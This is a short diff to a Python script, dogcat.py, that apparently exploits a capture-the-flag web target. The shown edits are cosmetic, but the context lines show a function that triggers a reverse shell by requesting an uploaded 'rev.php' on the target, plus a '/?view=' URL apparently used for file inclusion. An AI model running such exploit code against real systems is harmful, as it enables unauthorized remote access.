@@ -97,7 +97,7 @@ def activate_rev_shell(ip, url):
 
 	shell_url = "http://" + ip + "/rev.php"
 	
-	print("Requesting " + shell_url + ", shell should be coming.\n")
+	print("\nRequesting " + shell_url + ", shell should be coming.\n")
 	activate_shell_r = requests.get(shell_url)
 	exit(0)
 	
@@ -114,7 +114,7 @@ def main():
 	if len(sys.argv) < 2 or len(sys.argv) > 2:
 		print("Please use the format 'python3 dogcat.py <target IP>'")
 		exit(0)
-		fuser
+
 	ip = sys.argv[1]
 	url = "http://" + ip + "/?view="
 	
